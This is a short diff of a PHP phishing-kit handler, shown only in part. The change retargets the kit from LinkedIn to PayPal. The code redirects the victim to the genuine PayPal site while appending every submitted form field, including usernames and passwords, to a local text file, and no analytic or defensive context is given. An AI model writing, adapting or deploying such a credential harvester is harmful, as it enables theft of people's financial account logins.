@@ -1,6 +1,6 @@
 <?php
-header ('Location:https://www.linkedin.com/');
-$handle = fopen("linkedin.txt", "a");
+header ('Location:https://www.paypal.com/');
+$handle = fopen("paypal.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
